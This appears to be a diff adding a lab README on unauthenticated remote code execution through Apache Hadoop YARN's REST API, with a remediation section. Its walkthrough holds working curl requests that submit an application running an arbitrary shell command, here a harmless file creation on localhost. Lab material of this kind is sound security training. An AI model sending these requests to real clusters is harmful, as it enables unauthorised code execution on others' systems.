@@ -1,0 +1,60 @@
+# Apache Hadoop YARN ResourceManager Unauthenticated REST API RCE
+
+## Overview
+
+Apache Hadoop YARN is the resource management and job scheduling framework for distributed big data processing. When the YARN ResourceManager web interface is exposed without authentication (default on port 8088), remote attackers can leverage the REST API to submit malicious applications with arbitrary bash shell commands, obtaining code execution under the hadoop system user.
+
+- **Service Access**: `http://localhost:8162/`
+- **Default Credentials**: `Unauthenticated REST API`
+- **Docker Shortcut**: `./lab start hadoop-yarn-rce`
+- **Container Name**: `cyberlab_industry_hadoop_yarn_rce`
+- **RAM Footprint**: ~450M
+
+---
+
+## Exploitation Walkthrough
+
+### 1. Obtain New Application ID
+
+```bash
+curl -i -X POST 'http://localhost:8162/ws/v1/cluster/apps/new-application'
+```
+
+### 2. Submit Malicious Application Payload
+
+```bash
+curl -i -X POST 'http://localhost:8162/ws/v1/cluster/apps' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "application-id": "application_1234567890123_0001",
+    "application-name": "pwn",
+    "am-container-spec": {
+      "commands": {
+        "command": "touch /tmp/pwned_hadoop"
+      }
+    },
+    "application-type": "YARN"
+  }'
+```
+
+### 3. Verify File Creation Inside Container
+
+```bash
+docker exec -it cyberlab_industry_hadoop_yarn_rce ls -la /tmp/pwned_hadoop
+```
+
+---
+
+## Defensive Remediation & Hardening
+
+1. Enable Kerberos authentication for all Hadoop cluster daemons and REST endpoints.
+2. Bind the YARN ResourceManager REST interface strictly to private cluster networks.
+3. Configure hadoop.http.filter.initializers with enterprise authentication filters.
+
+---
+
+## Video Walkthroughs & Technical References
+
+- [2024 Guide: Hacking APIs](https://www.youtube.com/watch?v=k5HZI6CfHw4)
+- [Apache Hadoop Security Documentation](https://hadoop.apache.org/docs/current/hadoop-project-dist/hadoop-common/SecureMode.html)
+- [Vulhub Hadoop YARN Environment](https://vulhub.org/#/environments/hadoop/unacc/)
